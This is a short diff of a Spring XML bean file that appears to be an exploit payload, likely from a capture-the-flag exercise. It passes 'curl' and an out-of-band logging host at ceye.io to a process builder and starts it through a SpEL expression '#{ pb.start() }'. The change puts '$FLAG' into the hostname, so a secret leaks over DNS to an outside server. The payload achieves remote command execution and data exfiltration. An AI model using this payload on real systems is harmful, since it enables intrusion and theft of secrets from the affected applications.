@@ -8,7 +8,7 @@
      <constructor-arg>
         <list>
             <value>curl</value>
-            <value>123.zg80gf.ceye.io</value>
+            <value>$FLAG.zg80gf.ceye.io</value>
         </list>
     </constructor-arg>
      <property name="whatever" value="#{ pb.start() }"/>
